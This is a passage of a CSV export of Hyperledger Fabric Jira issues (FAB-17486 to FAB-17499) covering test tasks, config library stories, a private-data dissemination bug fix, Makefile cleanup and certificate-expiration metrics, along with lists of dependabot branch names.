o_modules/regression/barebones/golang.org/x/sys-0.1.0,dependabot/go_modules/tools/operator/github.com/opencontainers/runc-1.1.5,dependabot/go_modules/regression/barebones/k8s.io/client-go-0.20.0,dependabot/go_modules/chaincodes/marbles02_private/go/golang.org/x/net-0.7.0,dependabot/go_modules/tools/operator/github.com/docker/docker-20.10.24incompatible,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"19/Feb/20 12:10 AM;suryalnvs;https://github.com/hyperledger/fabric-test/pull/91;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Add Transient and Private Data Scenario to Azure,FAB-17486,44306,,Test Task,Closed,FAB,Fabric,software,denyeart,,,Medium,Won't Do,,btl5037,btl5037,10/Feb/20 12:44 PM,11/Jan/21 1:39 AM,28/Oct/23 3:09 AM,11/Jan/21 1:39 AM,,,,,,,,,,v1.4.7,v2.0.0,,,fabric-quality,,,,,,,,,0,azp-migrate,,,,,"Should be run on raw VM using Compose:
 * 5 RAFT orderers
 * 2 orgs
 * 2 peers per org
 * 2 of 2 endorsement policy
 * 1 channel
 * Chaincode
 ** samplecc
 ** marbles_private
 ** map

For this scenario this is only a need to run a light transaction and query volume on each chaincode.",,btl5037,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i0192i:s",,,,Unset,Unset,To Do,(Please add steps to reproduce),,Unset,,,,,,Unset,,System Test,,(Please add usage information),btl5037,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Implement function to generate ConfigGroup for a new Organization,FAB-17487,44310,,Story,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,dereckluo,sykesm,sykesm,10/Feb/20 11:12 PM,17/Mar/20 4:25 AM,28/Oct/23 3:09 AM,28/Feb/20 12:46 AM,,,,,,,,,,v2.1.0,,,,fabric-common,,,,,,,,,0,configtx,ipm,,,,"As a fabric administrator, I want to use a fit-for-purpose library function to generate a ConfigGroup representing an Organization. The input to the function should not depend on existing MSP material but should accept directly the necessary cryptographic material.

Acceptance

Calling the new function with appropriate arguments should generate a proto structure that is semantically equivalent to one generated by {{cryptogen}} and {{configtxgen -printOrg}}.",,dereckluo,sykesm,xwu,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,FAB-17628,,,No,,Unset,No,,,"1|i00n2e:8znqz9",,,,Unset,Unset,,(Please add steps to reproduce),2.0,Unset,,,,,,Unset,,Unset,,(Please add usage information),dereckluo,sykesm,xwu,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"20/Feb/20 1:36 AM;dereckluo;https://github.com/hyperledger/fabric/pull/693;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Implement function to compute a ConfigUpdate from a base and modified configuration transaction,FAB-17488,44311,,Story,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,tsharris,sykesm,sykesm,10/Feb/20 11:23 PM,17/Mar/20 4:18 AM,28/Oct/23 3:09 AM,28/Feb/20 12:46 AM,v2.1.0,,,,,,,,,v2.1.0,,,,fabric-common,,,,,,,,,0,configtx,ipm,,,,"As a fabric administrator, I want to use a fit-for-purpose library function to calculate a ConfigUpdate message that would update a {{base}} config to the {{modified}} config. This function should not need to be provided with anything beyond the two transactions.

Acceptance

Calling the new function with appropriate arguments should generate a {{ConfigUpdate}} that is semantically equivalent to the output of {{configtxlator compute_update}}.

See https://hyperledger-fabric.readthedocs.io/en/release-1.4/channel_update_tutorial.html for the current manual process.",,caod,sykesm,wlahti,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,FAB-17628,,,No,,Unset,No,,,"1|i00n2e:8znqzc",,,,Unset,Unset,,(Please add steps to reproduce),3.0,Unset,,,,,,Unset,,Unset,,(Please add usage information),caod,sykesm,wlahti,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"19/Feb/20 5:03 AM;wlahti;I think this is already incorporated into the PR for generating a channel creation transaction: [https://github.com/hyperledger/fabric/pull/686/files#diff-3e2ddd047942ccc5a05a4524a7e202d8R218];;;","19/Feb/20 6:40 AM;caod;The computation is, but we still don't have a function for actually processing a ConfigUpdate for old -> new;;;","21/Feb/20 2:46 AM;caod;[https://github.com/hyperledger/fabric/pull/698];;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Add Smoke Test to Azure,FAB-17489,44312,,Test Task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,btl5037,btl5037,btl5037,10/Feb/20 11:45 PM,05/Apr/20 11:33 AM,28/Oct/23 3:09 AM,03/Apr/20 10:34 PM,,,,,,,,,,v1.4.7,v2.0.0,,,fabric-quality,,,,,,,,,0,azp-migrate,,,,,"As it already exists, run the current smoke test suite as part of our nightly test suite in Azure using a VM with Compose. This will provide additional regression coverage until we can migrate existing test scenarios to Operator",,btl5037,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|hzwqhr:",,,,Unset,Unset,To Do,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),btl5037,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Add Information overviews to fabric dockerhub images,FAB-17490,44313,,Task,Backlog,FAB,Fabric,software,denyeart,,,Medium,,denyeart,denyeart,denyeart,10/Feb/20 11:53 PM,19/Apr/20 12:58 PM,28/Oct/23 3:09 AM,,,,,,,,,,,,,,,fabric-release,,,,,,,,,0,help-wanted,,,,,"The overview sections are currently blank for all images except
 [https://hub.docker.com/r/hyperledger/fabric-peer/]

Need to add image description to other images.",,denyeart,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i00wur:0j",,,,Unset,Unset,v2.x,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),denyeart,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"19/Apr/20 12:58 PM;denyeart;fabric-peer image description added to source control: [https://github.com/hyperledger/fabric/pull/662]

Description has been copied to docker hub. Still need to do the same for the other images.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Peer should not disseminate private data for other org's implicit collection,FAB-17491,44314,,Bug,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,wenjian,denyeart,denyeart,11/Feb/20 4:01 AM,27/Feb/20 11:50 PM,28/Oct/23 3:09 AM,27/Feb/20 11:50 PM,v2.0.0,,,,,,,,,v2.0.1,v2.1.0,,,fabric-ledger,,,,,,,,,0,,,,,,"FAB-17303 set a default dissemination policy for implicit collections of requiredPeerCount=0 and maxPeerCount=1. The intent was for this default to apply to implicit collections of the peer's own org. However it is being applied for other org's implicit collection as well.

Since implicit org-specific collections have an endorsement policy of the organization itself, the owning organization should manage the dissemination. There is no need for peers of other organizations to disseminate. That is, if org1 and org2 both endorse a write to org1 implicit collection as part of a larger transaction, only the org1 peer should disseminate the private data.

This work item will suppress the peer's private data dissemination for other organization's implicit collections.",,denyeart,wenjian,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,FAB-17303,FAB-17463,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,FAB-10889,,,No,,Unset,No,,,"1|i008rj:iwryp",,,,Unset,Unset,v2.0,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),denyeart,wenjian,,,,,,,,,,,,,release-2.0,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"18/Feb/20 10:43 PM;wenjian;PR: https://github.com/hyperledger/fabric/pull/688;;;","21/Feb/20 4:38 AM;denyeart;merged in master, will also backport to release-2.0.;;;","25/Feb/20 4:52 AM;wenjian;PR for release-2.0: https://github.com/hyperledger/fabric/pull/727;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
The name of the test function does not match the corresponding function,FAB-17492,44316,,Task,Closed,FAB,Fabric,software,denyeart,,,Lowest,Done,xwu,xwu,xwu,11/Feb/20 5:16 PM,12/Feb/20 12:01 AM,28/Oct/23 3:09 AM,12/Feb/20 12:01 AM,v2.0.0,,,,,,,,,,,,,fabric-common,,,,,,,,,0,,,,,,"In file common/util/utils_test.go,  function TestMetadataSignatureBytesNormal and TestMetadataSignatureBytesNil  are used to test function ConcatenateBytes in utils.go. But ""MetadataSignature"" in the function names is misleading, and should be modified to ""Concatenate"" to correspond to the function ConcatenateBytes.",,sykesm,xwu,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i0192r:",,,,Unset,Unset,,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unit Test,,(Please add usage information),sykesm,xwu,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"12/Feb/20 12:01 AM;sykesm;https://github.com/hyperledger/fabric/pull/655;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Cleanup Makefile,FAB-17493,44322,,Task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,btl5037,btl5037,btl5037,11/Feb/20 11:40 PM,18/Feb/20 12:08 AM,28/Oct/23 3:09 AM,18/Feb/20 12:08 AM,,,,,,,,,,v2.0.0,,,,fabric-quality,,,,,,,,,0,,,,,,"The Makefile has many unused or unnecessary targets. We should evaluate all targets in all scenarios and determine if they are needed, or if there is a better way to handle their functionality.",,btl5037,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i00uze:rzczqzxyzzx8zr",,,,Unset,Unset,In Progress,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),btl5037,,,,,,,,,,,,,,dependabot/go_modules/regression/publish/golang.org/x/sys-0.1.0,dependabot/go_modules/tools/operator/k8s.io/client-go-0.20.0,dependabot/go_modules/chaincodes/marbles02_private/go/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/smoke/golang.org/x/net-0.7.0,dependabot/go_modules/tools/chaincode-integration/resources/chaincode/simple-go/golang.org/x/net-0.7.0,dependabot/go_modules/regression/barebones/golang.org/x/net-0.7.0,dependabot/go_modules/tools/gotools/golang.org/x/sys-0.1.0,dependabot/go_modules/regression/smoke/github.com/docker/docker-20.10.24incompatible,dependabot/go_modules/tools/operator/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/smoke/github.com/opencontainers/runc-1.1.5,dependabot/go_modules/regression/publish/golang.org/x/text-0.3.8,dependabot/go_modules/regression/publish/github.com/opencontainers/runc-1.1.5,dependabot/go_modules/regression/smoke/golang.org/x/text-0.3.8,release-2.5,dependabot/go_modules/regression/publish/k8s.io/client-go-0.20.0,dependabot/go_modules/regression/barebones/github.com/opencontainers/runc-1.1.5,release-2.4,lindluni-patch-1,dependabot/go_modules/regression/basicnetwork/k8s.io/client-go-0.20.0,dependabot/go_modules/tools/chaincode-integration/resources/chaincode/simple-go/golang.org/x/text-0.3.8,dependabot/go_modules/regression/basicnetwork/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/publish/golang.org/x/net-0.7.0,dependabot/go_modules/regression/publish/golang.org/x/crypto-0.1.0,dependabot/go_modules/tools/operator/golang.org/x/sys-0.1.0,dependabot/go_modules/regression/basicnetwork/golang.org/x/net-0.7.0,dependabot/go_modules/regression/barebones/github.com/docker/docker-20.10.24incompatible,dependabot/go_modules/regression/smoke/golang.org/x/sys-0.1.0,dependabot/go_modules/regression/basicnetwork/github.com/opencontainers/runc-1.1.5,dependabot/go_modules/regression/barebones/golang.org/x/text-0.3.8,revert-342-mergify/bp/main/pr-340,dependabot/go_modules/regression/publish/github.com/docker/docker-20.10.24incompatible,dependabot/go_modules/regression/smoke/k8s.io/client-go-0.20.0,dependabot/go_modules/regression/basicnetwork/golang.org/x/sys-0.1.0,dependabot/go_modules/tools/operator/golang.org/x/net-0.7.0,dependabot/go_modules/tools/operator/golang.org/x/text-0.3.8,dependabot/go_modules/regression/basicnetwork/github.com/docker/docker-20.10.24incompatible,dependabot/go_modules/regression/basicnetwork/golang.org/x/text-0.3.8,dependabot/go_modules/regression/smoke/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/barebones/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/barebones/golang.org/x/sys-0.1.0,dependabot/go_modules/tools/operator/github.com/opencontainers/runc-1.1.5,dependabot/go_modules/regression/barebones/k8s.io/client-go-0.20.0,dependabot/go_modules/chaincodes/marbles02_private/go/golang.org/x/net-0.7.0,dependabot/go_modules/tools/operator/github.com/docker/docker-20.10.24incompatible,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Nomalize Logging,FAB-17494,44324,,Task,Closed,FAB,Fabric,software,denyeart,,,Medium,Won't Do,btl5037,btl5037,btl5037,12/Feb/20 12:00 AM,17/Mar/20 11:59 PM,28/Oct/23 3:09 AM,17/Mar/20 11:59 PM,,,,,,,,,,v2.0.0,,,,fabric-quality,,,,,,,,,0,,,,,,In logger.go and command.go we make use of multiwriters and an environment variable to decide how to handle logging output during execution. We should instead use the ginkgowriter as the default writer and properly pass the verbose flag to ginkgo only when necessary.,,btl5037,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i00uze:rzczqzxyzzx8zw",,,,Unset,Unset,In Progress,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),btl5037,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Remove Basic Network sample,FAB-17495,44325,,Task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,negupta,negupta,negupta,12/Feb/20 1:07 AM,12/Feb/20 3:06 AM,28/Oct/23 3:09 AM,12/Feb/20 3:06 AM,v2.0.0,,,,,,,,,,,,,fabric-samples,,,,,,,,,0,,,,,,"With the commercial paper sample and tutorial moving to the test network, the basic network is not used by any samples or tutorials. In the interest of maintaining one less sample, it should be removed.",,negupta,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,FAB-16604,,,No,,Unset,No,,,"1|i01943:",,,,Unset,Unset,,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),negupta,,,,,,,,,,,,,,dependabot/npm_and_yarn/asset-transfer-basic/rest-api-typescript/protobufjs-6.11.4,dependabot/npm_and_yarn/asset-transfer-basic/rest-api-typescript/tough-cookie-4.1.3,dependabot/npm_and_yarn/asset-transfer-basic/rest-api-typescript/semver-6.3.1,dependabot/npm_and_yarn/asset-transfer-basic/rest-api-typescript/grpc/grpc-js-1.8.17,dependabot/go_modules/high-throughput/application-go/google.golang.org/grpc-1.53.0,dependabot/npm_and_yarn/asset-transfer-basic/rest-api-typescript/word-wrap-1.2.4,dependabot/npm_and_yarn/asset-transfer-basic/rest-api-typescript/protobufjs-and-fabric-network-7.2.4,dependabot/go_modules/asset-transfer-basic/application-go/google.golang.org/grpc-1.53.0,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Remove Unused Files,FAB-17496,44326,,Task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,btl5037,btl5037,btl5037,12/Feb/20 2:54 AM,18/Feb/20 12:01 AM,28/Oct/23 3:09 AM,18/Feb/20 12:01 AM,,,,,,,,,,v2.0.0,,,,fabric-quality,,,,,,,,,0,,,,,,"After speaking with Gari, the value in migrating the remaining CTE tests is essentially non-existent. We can remove the entire directory.

LTE has been incorporated into Fabric and can be removed.

envsetup and fca-sample is completely unused.

Fabric-SDK-Node is no longer used anywhere, other than a stray reference to a chaincode that no longer exists in PTE.

Fabric-CA has a reference in Doc and nowhere else. This includes the Fabric-CA images

Fabric-Samples has chaincode referenced in PTE but that chaincode is now part of Fabric-Test, so we can change the pointers

 ",,btl5037,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i00uze:rzczqzxyzzx8zy",,,,Unset,Unset,In Progress,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),btl5037,,,,,,,,,,,,,,dependabot/go_modules/regression/publish/golang.org/x/sys-0.1.0,dependabot/go_modules/chaincodes/marbles02_private/go/golang.org/x/crypto-0.1.0,dependabot/go_modules/tools/operator/k8s.io/client-go-0.20.0,dependabot/go_modules/regression/smoke/golang.org/x/net-0.7.0,dependabot/go_modules/tools/chaincode-integration/resources/chaincode/simple-go/golang.org/x/net-0.7.0,dependabot/go_modules/regression/barebones/golang.org/x/net-0.7.0,dependabot/go_modules/tools/gotools/golang.org/x/sys-0.1.0,dependabot/go_modules/regression/smoke/github.com/docker/docker-20.10.24incompatible,dependabot/go_modules/tools/operator/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/smoke/github.com/opencontainers/runc-1.1.5,dependabot/go_modules/regression/publish/golang.org/x/text-0.3.8,dependabot/go_modules/regression/publish/github.com/opencontainers/runc-1.1.5,dependabot/go_modules/regression/smoke/golang.org/x/text-0.3.8,release-2.5,lindluni-patch-1,release-2.4,dependabot/go_modules/regression/publish/k8s.io/client-go-0.20.0,dependabot/go_modules/regression/barebones/github.com/opencontainers/runc-1.1.5,dependabot/go_modules/regression/basicnetwork/k8s.io/client-go-0.20.0,dependabot/go_modules/tools/chaincode-integration/resources/chaincode/simple-go/golang.org/x/text-0.3.8,dependabot/go_modules/regression/basicnetwork/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/publish/golang.org/x/net-0.7.0,dependabot/go_modules/regression/publish/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/barebones/github.com/docker/docker-20.10.24incompatible,dependabot/go_modules/regression/basicnetwork/golang.org/x/net-0.7.0,dependabot/go_modules/tools/operator/golang.org/x/sys-0.1.0,dependabot/go_modules/regression/smoke/golang.org/x/sys-0.1.0,dependabot/go_modules/regression/basicnetwork/github.com/opencontainers/runc-1.1.5,dependabot/go_modules/regression/barebones/golang.org/x/text-0.3.8,revert-342-mergify/bp/main/pr-340,dependabot/go_modules/regression/smoke/k8s.io/client-go-0.20.0,dependabot/go_modules/regression/basicnetwork/golang.org/x/sys-0.1.0,dependabot/go_modules/regression/publish/github.com/docker/docker-20.10.24incompatible,dependabot/go_modules/regression/basicnetwork/github.com/docker/docker-20.10.24incompatible,dependabot/go_modules/tools/operator/golang.org/x/net-0.7.0,dependabot/go_modules/tools/operator/golang.org/x/text-0.3.8,dependabot/go_modules/regression/basicnetwork/golang.org/x/text-0.3.8,dependabot/go_modules/regression/smoke/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/barebones/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/barebones/golang.org/x/sys-0.1.0,dependabot/go_modules/tools/operator/github.com/opencontainers/runc-1.1.5,dependabot/go_modules/chaincodes/marbles02_private/go/golang.org/x/net-0.7.0,dependabot/go_modules/regression/barebones/k8s.io/client-go-0.20.0,dependabot/go_modules/tools/operator/github.com/docker/docker-20.10.24incompatible,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Add certificate expiration metrics,FAB-17497,44327,,Story,Backlog,FAB,Fabric,software,denyeart,,,Low,,,kantipov,kantipov,12/Feb/20 9:40 PM,17/Dec/20 8:15 AM,28/Oct/23 3:09 AM,,,,,,,,,,,,,,,fabric-crypto,,,,,,,,,1,help-wanted,,,,,"Following up the idea https://jira.hyperledger.org/browse/FAB-17000
 Checking the logs could be quite annoying and error-prone, so it would be really helpful to have metrics with ""Not After"" value for all used certificates. These metrics can be implemented for the orderer, peer and ca as well. I would suggest that metrics are created for any unique used certificate, regardless of its type - tls, identity, ca, etc.

Something like:
{code:java}
cert_not_after{issuer=""tlsca.domain.com"",cn=""ca.domain.com""} 1581351701
cert_not_after{issuer=""ca.domain.com"",cn=""orderer01.domain.com""} 1581351810
cert_not_after{issuer=""ca.domain.com"",cn=""admin""} 1581351933{code}
This approach might be quite redundant, but reliable and configurable.",,kantipov,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,FAB-17000,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i0194b:",,,,Unset,Unset,,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),kantipov,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"30/Oct/20 8:12 PM;kantipov;I wrote a simple exporter for kubernetes hosted environments:
[https://github.com/kantipov/hlf-cert-exporter]
May be would be helpful to somebody.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
"Fabric-Samples; Using beta images with test-network",FAB-17498,44328,,Bug,Closed,FAB,Fabric,software,denyeart,,,Medium,Invalid: Works as Expected,mbwhite,mbwhite,mbwhite,12/Feb/20 11:29 PM,26/Apr/20 12:56 PM,28/Oct/23 3:09 AM,26/Apr/20 12:56 PM,,,,,,,,,,,,,,fabric-samples,,,,,,,,,0,,,,,,"1) CP Scripts where using the 2.0.0-beta flag when starting the test network. This should now be 2.0.0

2) When run with deployment options, the test-network didn't correctly commit the chaincode.",,denyeart,mbwhite,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i0194j:",,,,Unset,Unset,,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),denyeart,mbwhite,,,,,,,,,,,,,dependabot/npm_and_yarn/asset-transfer-basic/rest-api-typescript/protobufjs-6.11.4,dependabot/npm_and_yarn/asset-transfer-basic/rest-api-typescript/tough-cookie-4.1.3,dependabot/npm_and_yarn/asset-transfer-basic/rest-api-typescript/semver-6.3.1,dependabot/npm_and_yarn/asset-transfer-basic/rest-api-typescript/grpc/grpc-js-1.8.17,dependabot/go_modules/high-throughput/application-go/google.golang.org/grpc-1.53.0,dependabot/npm_and_yarn/asset-transfer-basic/rest-api-typescript/word-wrap-1.2.4,dependabot/npm_and_yarn/asset-transfer-basic/rest-api-typescript/protobufjs-and-fabric-network-7.2.4,dependabot/go_modules/asset-transfer-basic/application-go/google.golang.org/grpc-1.53.0,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"19/Apr/20 12:53 PM;denyeart;[~mbwhite] can this one be closed now?;;;","26/Apr/20 12:56 PM;denyeart;No response, I'll close since I know the samples were updated to use v2.0 chaincode and SDK.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
simplify barebones test,FAB-17499,44329,,Test Task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,dongming,dongming,dongming,12/Feb/20 11:43 PM,26/Feb/20 5:52 AM,28/Oct/23 3:09 AM,26/Feb/20 5:52 AM,,,,,,,,,,,,,,fabric-quality,,,,,,,,,0,,,,,,simplify barebones test by changing loop of threads to two input yml files,,dongming,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,FAB-10083,,,No,,Unset,No,,,"1|i0194r:",,,,Unset,Unset,,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),dongming,,,,,,,,,,,,,,dependabot/go_modules/regression/publish/golang.org/x/sys-0.1.0,dependabot/go_modules/chaincodes/marbles02_private/go/golang.org/x/crypto-0.1.0,dependabot/go_modules/tools/operator/k8s.io/client-go-0.20.0,dependabot/go_modules/regression/smoke/golang.org/x/net-0.7.0,dependabot/go_modules/tools/chaincode-integration/resources/chaincode/simple-go/golang.org/x/net-0.7.0,dependabot/go_modules/regression/barebones/golang.org/x/net-0.7.0,dependabot/go_modules/tools/gotools/golang.org/x/sys-0.1.0,dependabot/go_modules/regression/smoke/github.com/docker/docker-20.10.24incompatible,dependabot/go_modules/tools/operator/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/smoke/github.com/opencontainers/runc-1.1.5,dependabot/go_modules/regression/publish/golang.org/x/text-0.3.8,dependabot/go_modules/regression/publish/github.com/opencontainers/runc-1.1.5,dependabot/go_modules/regression/smoke/golang.org/x/text-0.3.8,release-2.5,release-2.4,lindluni-patch-1,dependabot/go_modules/regression/publish/k8s.io/client-go-0.20.0,dependabot/go_modules/regression/barebones/github.com/opencontainers/runc-1.1.5,dependabot/go_modules/regression/basicnetwork/k8s.io/client-go-0.20.0,dependabot/go_modules/tools/chaincode-integration/resources/chaincode/simple-go/golang.org/x/text-0.3.8,dependabot/go_modules/regression/basicnetwork/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/publish/golang.org/x/net-0.7.0,dependabot/go_modules/regression/publish/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/basicnetwork/golang.org/x/net-0.7.0,dependabot/go_modules/regression/barebones/github.com/docker/docker-20.10.24incompatible,dependabot/go_modules/tools/operator/golang.org/x/sys-0.1.0,dependabot/go_modules/regression/smoke/golang.org/x/sys-0.1.0,dependabot/go_modules/regression/basicnetwork/github.com/opencontainers/runc-1.1.5,dependabot/go_modules/regression/barebones/golang.org/x/text-0.3.8,revert-342-mergify/bp/main/pr-340,dependabot/go_modules/regression/publish/github.com/docker/docker-20.10.24incompatible,dependabot/go_modules/regression/smoke/k8s.io/client-go-0.20.0,dependabot/go_modules/regression/basicnetwork/golang.org/x/sys-0.1.0,dependabot/go_modules/tools/operator/golang.org/x/text-0.3.8,dependabot/go_modules/tools/operator/golang.org/x/net-0.7.0,dependabot/go_modules/regression/basicnetwork/github.com/docker/docker-20.10.24incompatible,dependabot/go_modules/regression/basicnetwork/golang.org/x/text-0.3.8,dependabot/go_modules/regression/smoke/golang.org/x/crypto-0.1.0,dependabot/go_modules/